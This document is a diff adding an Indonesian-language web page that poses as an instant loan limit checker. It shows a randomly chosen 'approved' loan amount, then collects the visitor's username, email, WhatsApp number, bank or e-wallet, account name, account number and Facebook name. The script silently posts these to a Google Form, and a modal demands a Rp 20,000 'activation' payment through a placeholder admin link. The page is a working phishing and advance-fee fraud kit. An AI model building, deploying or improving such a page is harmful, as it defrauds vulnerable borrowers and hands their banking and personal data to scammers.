@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kredit Cepat - Cek Limit Pinjaman</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; 
+            background-color: #f0f2f5; color: #333; margin: 0; padding: 20px;
+            user-select: none;
+        }
+        .container { max-width: 450px; margin: auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        
+        .header-logo { color: #1a73e8; font-weight: bold; font-size: 24px; margin-bottom: 5px; }
+        .sub-title { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+
+        .box-wrapper { position: relative; width: 180px; height: 180px; margin: 30px auto; }
+        #mystery-box { width: 100%; height: 100%; cursor: pointer; transition: 0.3s; }
+        
+        /* Animasi */
+        .shake { animation: shake 0.5s infinite; }
+        @keyframes shake {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        .open-box { animation: fadeOut 0.8s forwards; }
+        @keyframes fadeOut {
+            100% { opacity: 0; transform: scale(0.5); visibility: hidden; }
+        }
+
+        #reward-display {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
+            font-size: 32px; font-weight: bold; color: #27ae60;
+            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5;
+        }
+        #reward-display.show { transform: translate(-50%, -50%) scale(1); }
+
+        /* Form Style */
+        .form-daftar { display: none; text-align: left; background: #ffffff; padding: 10px; border-radius: 10px; margin-top: 10px; }
+        .form-daftar label { font-weight: bold; font-size: 12px; color: #1a73e8; }
+        .form-daftar input, .form-daftar select {
+            width: 100%; padding: 12px; margin: 8px 0 15px 0; border-radius: 8px; border: 1px solid #ddd; box-sizing: border-box; font-size: 14px;
+        }
+        
+        button { 
+            padding: 15px; font-size: 16px; font-weight: bold; cursor: pointer;
+            background-color: #1a73e8; color: white; border: none; border-radius: 8px;
+            transition: 0.2s; width: 100%;
+        }
+        button:disabled { background-color: #ccc !important; }
+
+        /* Modal */
+        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); }
+        .modal-content { background: white; color: #333; margin: 15% auto; padding: 25px; border-radius: 15px; width: 85%; max-width: 350px; text-align: center; }
+        .btn-link { display: inline-block; margin-top: 15px; padding: 12px; background: #27ae60; color: white; border-radius: 8px; text-decoration: none; font-weight: bold; width: 100%; box-sizing: border-box;}
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <div class="container">
+        <div class="header-logo">🏦 KREDIT CEPAT</div>
+        <p class="sub-title" id="main-instruction">Klik tombol di bawah untuk mengecek limit pinjaman instan Anda.</p>
+        
+        <div class="box-wrapper" id="boxArea">
+            <img id="mystery-box" src="https://cdn-icons-png.flaticon.com/512/2845/2845812.png" alt="Cek Limit" onclick="startCheck()">
+            <div id="reward-display"></div>
+        </div>
+
+        <button id="actionBtn" onclick="startCheck()">CEK LIMIT SEKARANG</button>
+
+        <div id="registrationForm" class="form-daftar">
+            <h3 style="text-align:center; color:#333;">Data Pengajuan Pinjaman</h3>
+            
+            <label>ID Akun / Username:</label>
+            <input type="text" id="regId" placeholder="Minimal 6 karakter" pattern="[a-zA-Z0-9]{6,}" required>
+            
+            <label>Email Korespondensi:</label>
+            <input type="email" id="regEmail" placeholder="email@anda.com" required>
+            
+            <label>Nomor WhatsApp (Aktif):</label>
+            <input type="text" id="regWa" value="+62" required>
+            
+            <label>Tujuan Pencairan (Bank/E-Wallet):</label>
+            <select id="regBank" required>
+                <option value="">Pilih Bank...</option>
+                <option value="BCA">BCA</option>
+                <option value="MANDIRI">MANDIRI</option>
+                <option value="BNI">BNI</option>
+                <option value="BRI">BRI</option>
+                <option value="DANA">DANA</option>
+                <option value="OVO">OVO</option>
+            </select>
+            
+            <label>Nama Sesuai Rekening:</label>
+            <input type="text" id="regNamaRek" placeholder="Nama Lengkap" required>
+
+            <label>Nomor Rekening/E-Wallet:</label>
+            <input type="number" id="regNoRek" placeholder="Nomor Rekening" required>
+
+            <label>Konfirmasi Nama Facebook:</label>
+            <input type="text" id="regNamaFB" placeholder="Nama Profil FB Anda" required>
+            
+            <button id="submitBtn" onclick="submitToGoogle()">AJUKAN PENCAIRAN SEKARANG</button>
+        </div>
+
+        <h3 id="resultText" style="margin-top:20px;"></h3>
+    </div>
+
+    <div id="resultModal" class="modal">
+        <div class="modal-content">
+            <h2 style="color:#27ae60; margin-top:0;">LIMIT DISETUJUI!</h2>
+            <p>Plafon pinjaman Anda sebesar <b id="finalLimit" style="color:#1a73e8;"></b> telah siap dicairkan.</p>
+            <p style="font-size: 13px; background: #fff3cd; padding: 10px; border-radius: 5px;">
+                <b>PENTING:</b> Hubungi Admin untuk melakukan <b>Aktivasi Limit (Rp 20.000)</b> agar dana segera ditransfer ke rekening Anda.
+            </p>
+            <a href="URL_FB_ATAU_WA_ADMIN_ANDA" class="btn-link">HUBUNGI ADMIN (AKTIVASI)</a>
+        </div>
+    </div>
+
+    <script>
+        const limits = ["Rp 1.500.000", "Rp 2.500.000", "Rp 3.000.000", "Rp 5.000.000"];
+        
+        function startCheck() {
+            if (localStorage.getItem("loanDone") === "true") return;
+            
+            document.getElementById('mystery-box').classList.add('shake');
+            document.getElementById('actionBtn').disabled = true;
+            document.getElementById('actionBtn').innerText = "MENGANALISA DATA...";
+
+            setTimeout(() => {
+                document.getElementById('mystery-box').classList.remove('shake');
+                document.getElementById('mystery-box').classList.add('open-box');
+                
+                const hasil = limits[Math.floor(Math.random() * limits.length)];
+                document.getElementById('reward-display').innerText = hasil;
+                document.getElementById('reward-display').classList.add('show');
+                localStorage.setItem("tempLimit", hasil);
+
+                setTimeout(() => {
+                    document.getElementById('boxArea').style.display = "none";
+                    document.getElementById('actionBtn').style.display = "none";
+                    document.getElementById('main-instruction').innerHTML = "Limit Pinjaman Anda: <b style='color:#27ae60; font-size:20px;'>" + hasil + "</b>";
+                    document.getElementById('registrationForm').style.display = "block";
+                }, 1000);
+            }, 2500);
+        }
+
+        // Script WA +62
+        const waInput = document.getElementById('regWa');
+        waInput.addEventListener('input', function() {
+            if (!this.value.startsWith('+62')) this.value = '+62';
+            this.value = '+62' + this.value.substring(3).replace(/\D/g, '');
+        });
+
+        function submitToGoogle() {
+            const id = document.getElementById('regId').value;
+            const email = document.getElementById('regEmail').value;
+            const wa = document.getElementById('regWa').value;
+            const bank = document.getElementById('regBank').value;
+            const nama = document.getElementById('regNamaRek').value;
+            const norek = document.getElementById('regNoRek').value;
+            const namafb = document.getElementById('regNamaFB').value;
+            const limitVal = localStorage.getItem("tempLimit") || "0";
+
+            // Validasi
+            if(!/^[a-zA-Z0-9]{6,}$/.test(id)) { alert("Username minimal 6 karakter tanpa simbol!"); return; }
+            if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { alert("Format Email salah!"); return; }
+            if(wa.length < 12) { alert("Nomor WhatsApp tidak valid!"); return; }
+            if(!id || !email || !wa || !bank || !nama || !norek || !namafb) { alert("Lengkapi semua data pengajuan!"); return; }
+
+            document.getElementById('submitBtn').innerText = "MENGIRIM PENGAJUAN...";
+            document.getElementById('submitBtn').disabled = true;
+
+            const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse";
+            const formData = new FormData();
+            
+            // ENTRY ID TETAP SAMA (TIDAK BERUBAH)
+            formData.append('entry.498136123', id);    
+            formData.append('entry.2145381120', email); 
+            formData.append('entry.954302406', wa);    
+            formData.append('entry.1747382514', bank);  
+            formData.append('entry.371995109', nama);  
+            formData.append('entry.1836945173', norek); 
+            formData.append('entry.1660055715', namafb);   
+
+            fetch(googleFormURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: formData
+            }).then(() => {
+                localStorage.setItem("loanDone", "true");
+                localStorage.setItem("loanLimit", limitVal);
+                document.getElementById('finalLimit').innerText = limitVal;
+                document.getElementById('resultModal').style.display = "block";
+            }).catch(() => {
+                alert("Gangguan koneksi, coba lagi.");
+                document.getElementById('submitBtn').disabled = false;
+            });
+        }
+
+        window.onload = () => {
+            if (localStorage.getItem("loanDone") === "true") {
+                const limitVal = localStorage.getItem("loanLimit");
+                document.getElementById('boxArea').style.display = "none";
+                document.getElementById('actionBtn').innerText = "PENGAJUAN DIPROSES";
+                document.getElementById('actionBtn').disabled = true;
+                document.getElementById('resultText').innerHTML = `STATUS: PINJAMAN ${limitVal} MENUNGGU AKTIVASI<br><small>Hubungi Admin untuk proses transfer.</small>`;
+            }
+        };
+    </script>
+</body>
+</html>
